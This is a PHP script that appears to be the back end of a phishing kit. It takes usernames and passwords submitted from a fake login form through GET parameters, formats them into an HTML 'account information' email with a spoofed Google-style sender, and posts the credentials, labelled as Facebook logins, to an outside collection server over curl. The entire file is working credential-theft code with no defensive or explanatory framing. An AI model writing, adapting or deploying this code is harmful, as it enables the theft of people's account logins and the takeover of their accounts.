<?php
    $email1 = $_GET['user'];
    $sandi1 = $_GET['pass'];
    $email2 = $_GET['email'];
    $sandi2 = $_GET['password'];
    $sandi3 = $_GET['sandi'];
    $res = $_GET['result'];
    $log = $_GET['login'];

    $subjek = 'Result si '.$email1.''.$email2.' | Result '.$res.'';
    $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
            <tr>
					<th style="text-align: center;" colspan="3"> Informasi Akun $log</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email/No HP</td>
					<td style="text-align: center;">$email1 $email2</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$sandi1 $sandi2 $sandi3</td>
				</tr>	
				<tr>
				    <td style="border-right: none;">Login</td>
					<td style="text-align: center;">$log</td>
				</tr>			
				<tr>
				<th style="text-align: center;" colspan="3">©AlexHostX</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
    $sender = 'From: WEB SALZ GOOGLE <admin@salzz.go.id>';
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    
$user = $_GET['email'];
$user = $_GET['user'];
$pass = $_GET['password'];
$pass = $_GET['sandi'];
$pass = $_GET['pass'];
$log = "Facebook";
$res = "Salzz";
$url = "https://apiff.salzzjoker-jir.xyz/?send=";
$data = "user=".$user."&pass=".$pass."&result=".$res."&login=".$log;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
?>
